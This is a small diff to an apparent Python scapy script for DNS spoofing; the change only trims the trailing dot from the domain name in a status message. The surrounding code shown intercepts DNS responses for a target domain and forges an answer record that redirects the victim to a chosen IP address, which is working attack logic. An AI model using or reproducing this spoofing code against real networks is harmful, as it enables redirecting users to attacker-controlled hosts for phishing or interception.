@@ -27,7 +27,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
         if url in qname:
-            print("[+] Spoofing Target's DNS: http://" + qname.decode("UTF-8") + " and redirecting them to " + ip)
+            print("[+] Spoofing Target's DNS: http://" + qname[0: -1].decode("UTF-8") + " and redirecting them to " + ip)
             answer = scapy.DNSRR(rrname=qname, rdata=ip)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
